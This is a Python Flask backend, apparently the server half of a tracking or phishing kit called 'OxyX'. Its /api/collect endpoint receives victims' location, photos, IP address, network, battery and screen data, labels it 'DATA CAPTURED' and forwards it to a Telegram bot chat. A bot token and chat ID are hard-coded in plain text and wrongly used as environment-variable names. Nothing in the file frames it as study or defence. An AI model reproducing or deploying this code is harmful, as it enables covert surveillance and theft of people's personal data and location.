from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = os.environ.get('8211111180:AAFkOZqZCAM_gKsi6JWDWejXzhgOAymKTkw')
ADMIN_CHAT_ID = os.environ.get('6865071834')

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        print("📱 Data received from:", request.remote_addr)
        
        # Format message for Telegram
        message = f"""
🔴 **OXyX DATA CAPTURED** 🔴

📅 Time: {data.get('timestamp', 'N/A')}
🌐 IP: {request.remote_addr}
📱 Platform: {data.get('platform', 'N/A')}
📍 Location: {data.get('location', 'N/A')}
📸 Photos: {len(data.get('photos', []))}

📶 Network: {data.get('network', 'N/A')}
🔋 Battery: {data.get('battery', 'N/A')}
🖥️ Screen: {data.get('screen', 'N/A')}
🌍 Language: {data.get('language', 'N/A')}

#OxyX #{data.get('platform', 'Unknown').replace(' ', '')}
        """
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": ADMIN_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })
        
        return jsonify({"status": "success", "message": "Data sent to Telegram"})
    
    except Exception as e:
        print("❌ Error:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "service": "OxyX Backend"})

@app.route('/')
def home():
    return "OxyX Backend API is running"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
